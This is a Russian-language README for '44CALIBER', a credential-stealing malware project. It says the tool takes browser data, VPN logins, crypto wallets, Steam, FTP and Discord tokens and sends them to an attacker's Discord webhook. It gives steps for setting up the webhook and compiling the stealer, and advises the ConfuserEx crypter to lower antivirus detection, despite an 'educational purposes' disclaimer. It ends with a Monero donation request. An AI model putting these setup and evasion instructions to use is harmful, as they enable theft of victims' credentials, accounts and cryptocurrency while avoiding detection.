Стиллер с отправкой логов в дискорд бот при помощи Discord Webhook API.

:closed_lock_with_key: Поддержка Chrome v80+, Firefox v75+, стилит впн, криптокошельки, ваймворлд, стим, фтп, достает BSSID, токен и сессия дискорд, и т.д.

![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/1.png)

:exclamation: Написан исключительно в образовательных целях! Я не несу ответственности за использование данного проекта и любых его частей кода.

---

1) Создать Discord Webhook в разделе интеграций в чате дискорда, в который будут приходить логи.

![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/2.png)

2) В сурсе Resources->Discord->DiscordWebhook.cs поменять данные на свои:

![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/3.png)

ВАЖНО :exclamation:
Не создавайте бота с русскими символами, иначе логи приходить не будут.

3) Скомпилить.

На выходе файл на антискане будет ~7/26. Юзай криптор ConfuserEx для 1/26.

![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/4.png)

![Image alt](https://github.com/Khainaaeh/44CALIBER/blob/main/screenshots/5.png)
---

Based on Reborn Stealer - https://github.com/PyluOtBabylu/Reborn-Stealer-2021-SOURCE

Donate me -
Monero:

48f3giiLzUxNawqSb46ZWpMMyFFsSpvepQ4dHcVH1wS4jYNteUSom1k1RU4moDERpdF9mDNfZgUzQXrtsZa2ajWA4LfTe4w


